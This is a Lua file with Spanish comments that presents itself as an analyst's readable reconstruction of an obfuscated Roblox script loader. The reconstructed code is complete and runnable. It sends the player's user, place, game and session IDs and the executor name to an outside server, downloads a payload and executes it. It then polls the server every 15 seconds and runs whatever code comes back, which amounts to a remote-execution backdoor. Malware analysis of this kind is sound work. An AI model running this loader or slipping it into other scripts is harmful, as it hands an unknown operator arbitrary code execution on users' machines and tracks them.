--[=[
DUELos.lua — reconstrucción legible del loader

Tipo de resultado: reconstrucción de alto nivel basada en el bytecode
recuperado de la VM del archivo original. No es una copia literal del texto
original (el original ejecuta bytecode virtualizado).

IMPORTANTE:
- Este archivo reproduce el flujo del loader identificado en el análisis.
- El payload principal de /x/d y los fragmentos de /x/m NO están embebidos en
  Duelos.lua; el servidor los entrega en tiempo de ejecución.
- No se ha contactado ni ejecutado el servidor durante la reconstrucción.
]=]

-- El preámbulo original establece este marcador antes de entrar en la VM.
_G.UZ_S = "api-duelos-auth"

local marker = _G.UZ_S
_G.UZ_S = nil

-- La VM original abandona el flujo si el marcador no era una cadena.
if type(marker) ~= "string" then
    return
end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

if not LocalPlayer then
    return
end

local BASE_URL = "https://uzivert-web.onrender.com"

-- Wrapper capturado por las funciones internas de la VM.
local function httpGet(url)
    return game:HttpGet(url)
end

-- Obtiene el nombre del executor. Si identifyexecutor no existe o falla,
-- conserva "?". Elimina caracteres que no sean alfanuméricos.
local executorName = "?"

pcall(function()
    if identifyexecutor then
        executorName = tostring(identifyexecutor())
    end
end)

executorName = executorName:gsub("[^%w]", "")

-- Solicitud inicial de autenticación/registro.
local authURL = BASE_URL
    .. "/x/c?s=" .. marker
    .. "&u=" .. tostring(LocalPlayer.UserId)
    .. "&p=" .. tostring(game.PlaceId)
    .. "&g=" .. tostring(game.GameId)
    .. "&j=" .. tostring(game.JobId)
    .. "&e=" .. executorName
    .. "&t=" .. tostring(os.time())

local authOK, authResponse = pcall(httpGet, authURL)
if not authOK then
    return
end

authResponse = tostring(authResponse)

-- La respuesta de /x/c entrega estos campos como pares clave=valor.
local n = authResponse:match("n=(%w+)")
local k = authResponse:match("k=(%d+)")
local t = authResponse:match("t=(%w+)")
local initialCursor = authResponse:match("l=(%d+)")
local multiplier = tonumber(authResponse:match("m=(%d+)"))
local modulus = tonumber(authResponse:match("o=(%d+)"))

if not (n and k and t and multiplier and modulus and modulus ~= 0) then
    return
end

-- Hash polinómico reproducido a partir de la VM:
-- data = tostring(k) .. tostring(UserId) .. tostring(PlaceId)
-- h(i) = (h(i-1) * multiplier + byte(data[i])) % modulus
local hashInput = tostring(k)
    .. tostring(LocalPlayer.UserId)
    .. tostring(game.PlaceId)

local hash = 0
for i = 1, #hashInput do
    hash = (hash * multiplier + string.byte(hashInput, i)) % modulus
end

-- Solicita el payload principal. La respuesta de /x/d se compila y ejecuta
-- mediante loadstring en el loader original.
local payloadURL = BASE_URL
    .. "/x/d?n=" .. n
    .. "&h=" .. tostring(hash)

local payloadOK, payloadResponse = pcall(httpGet, payloadURL)
if not payloadOK then
    return
end

local payloadSource = tostring(payloadResponse)
local payloadChunk, compileError = loadstring(payloadSource)

if type(payloadChunk) ~= "function" then
    -- El original abandona el flujo si no puede obtener un chunk ejecutable.
    return
end

-- Ejecuta el payload descargado desde /x/d.
payloadChunk()

-- Monitor remoto periódico. El bytecode recuperado comprueba Parent del
-- jugador, espera 15 segundos y consulta /x/m.
task.spawn(function()
    local cursor = tonumber(initialCursor) or 0

    while LocalPlayer.Parent do
        task.wait(15)

        local monitorURL = BASE_URL
            .. "/x/m?k=" .. t
            .. "&l=" .. tostring(cursor)
            .. "&v=2"

        local monitorOK, monitorResponse = pcall(httpGet, monitorURL)

        if monitorOK and type(monitorResponse) == "string" then
            -- El loader solo acepta respuestas con este prefijo.
            if monitorResponse:sub(1, 5) == "--UZ\n" then
                local updateChunk = loadstring(monitorResponse)

                if type(updateChunk) == "function" then
                    -- El bytecode protege la ejecución de cada actualización
                    -- con pcall para que un error no rompa el bucle del monitor.
                    pcall(updateChunk)
                end
            end
        end

        -- Una actualización puede escribir _G.UZ_LAST para comunicar el
        -- siguiente cursor. Si no hay un número válido, se conserva el actual.
        local nextCursor = tonumber(_G.UZ_LAST)
        if nextCursor then
            cursor = nextCursor
        end
    end
end)
